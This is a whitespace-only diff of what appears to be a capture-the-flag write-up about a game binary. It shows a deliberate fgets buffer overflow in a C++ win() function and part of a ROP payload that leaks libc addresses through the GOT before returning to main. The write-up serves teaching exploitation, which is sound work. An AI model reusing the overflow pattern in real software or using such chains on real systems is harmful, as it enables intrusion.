@@ -40,7 +40,7 @@ Interestingly, sometimes after a fight, points can become a negative integer. If
 
 ```cpp
 bool Game::DidWin() {
-	return 99 < points; // unsigned comparison
+  return 99 < points; // unsigned comparison
 }
 ```
 
@@ -55,13 +55,13 @@ What is your name, fierce warrior?
 
 ```cpp
 void win() {
-	char warrior_name [32];
-	std::cout << "Congratulations! Minstrals will sing of your triumphs for millenia to co me." << std::endl;
-	std::cout << "What is your name, fierce warrior? ";
+  char warrior_name [32];
+  std::cout << "Congratulations! Minstrals will sing of your triumphs for millenia to co me." << std::endl;
+  std::cout << "What is your name, fierce warrior? ";
 
-	fgets(warrior_name, 256, stdin); // <- buffer overflow
+  fgets(warrior_name, 256, stdin); // <- buffer overflow
 
-	// ...
+  // ...
 }
 ```
 
@@ -119,7 +119,7 @@ payload = flat(
     pop_rdi_pop_rbp_ret + got_puts_addr + dummy_rbp + plt_puts_addr,
     pop_rdi_pop_rbp_ret + got_fgets_addr + dummy_rbp + plt_puts_addr,
     pop_rdi_pop_rbp_ret + got_rand_addr + dummy_rbp + plt_puts_addr,
-		main_fn_addr, # call main() again for later
+    main_fn_addr, # call main() again for later
     b'\0',
 )
 
